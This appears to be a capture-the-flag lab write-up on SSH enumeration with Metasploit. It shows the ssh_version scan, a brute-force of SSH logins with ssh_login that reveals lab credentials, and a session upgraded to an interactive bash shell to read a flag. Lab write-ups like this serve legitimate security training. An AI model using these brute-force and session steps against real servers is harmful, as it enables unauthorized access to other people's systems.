# SSH Enumeration Lab

### Run the following modules against the target

```bash
use auxiliary/scanner/ssh/ssh_version

# Output
Type                     Value                     Note
  ----                     -----                     ----
  encryption.compression   none
  encryption.compression   zlib@openssh.com
  encryption.encryption    chacha20-poly1305@openss
                           h.com
  encryption.encryption    aes128-ctr
  encryption.encryption    aes192-ctr
  encryption.encryption    aes256-ctr
  encryption.encryption    aes128-gcm@openssh.com
  encryption.encryption    aes256-gcm@openssh.com
~~~
```

**auxiliary/scanner/ssh/ssh_login**
```bash
# Bruteforce username and password pair
use auxiliary/scanner/ssh/ssh_login

# Output
[*] 192.197.16.3:22 - Starting bruteforce
[+] 192.197.16.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 2 opened (192.197.16.2:46519 -> 192.197.16.3:22) at 2025-07-11 06:55:28 +0530
[+] 192.197.16.3:22 - Success: 'rooty:pineapple' 'uid=1001(rooty) gid=1001(rooty) groups=1001(rooty) Linux demo.ine.local 6.8.0-48-generic #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
~~~
```

**Find the flag**
```bash
# After bruteforcing, do
auxiliary (module)> sessions
auxiliary (module)> session 8

#Output
[*] Starting interaction with 8...

# Create bash session
shell

[*] Starting interaction with 8...
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /usr/bin/bash

/bin/bash -i

# Explore directories and finally (flag!)
diag@demo://$ ls
ls
bin   dev  flag  lib    lib64   media  opt   root  sbin  sys  usr
boot  etc  home  lib32  libx32  mnt    proc  run   srv   tmp  var

diag@demo://$ cat flag
cat flag
<flag>
```